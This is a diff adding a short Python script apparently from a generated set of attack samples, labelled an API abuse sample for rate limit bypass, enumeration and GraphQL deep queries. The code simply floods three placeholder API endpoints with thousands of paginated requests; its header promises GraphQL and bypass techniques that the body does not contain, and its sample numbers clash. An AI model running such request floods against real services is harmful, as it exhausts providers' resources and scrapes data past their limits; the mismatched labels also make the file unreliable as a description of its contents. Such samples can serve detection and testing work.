@@ -1,0 +1,21 @@
+# Resource Exhaustion - API Abuse Sample 7
+# Created: 2026-03-30T22:24:11.730089
+# Type: API Rate Limit Bypass / Enumeration / GraphQL Deep Query
+
+# API Rate Limit Bypass - Sample 1
+import requests
+import time
+
+def api_abuse():
+    urls = [
+        "https://api.example.com/data",
+        "https://api.example.com/query",
+        "https://api.example.com/search"
+    ]
+    for url in urls:
+        for i in range(1000):
+            requests.get(f"{url}?page={i}")
+            time.sleep(0.001)
+
+if __name__ == "__main__":
+    api_abuse()
